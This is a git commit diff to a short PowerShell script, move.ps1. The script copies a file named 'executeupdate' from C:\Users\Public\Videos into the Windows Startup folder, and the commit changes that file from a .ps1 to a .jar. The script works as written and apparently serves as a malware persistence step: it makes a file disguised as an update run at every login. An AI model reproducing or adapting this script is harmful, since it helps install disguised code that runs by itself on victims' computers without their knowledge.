3cb5364a251de914b179e828a9f8f166b94a15e1
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-02-23 17:47:26 +0100

    Update move.ps1

--- move.ps1
+++ move.ps1
@@ -1,4 +1,4 @@
-$sourceFile = "C:\Users\Public\Videos\executeupdate.ps1"
+$sourceFile = "C:\Users\Public\Videos\executeupdate.jar"
 $destinationFolder = [Environment]::GetFolderPath("Startup")
 
 Copy-Item -Path $sourceFile -Destination $destinationFolder
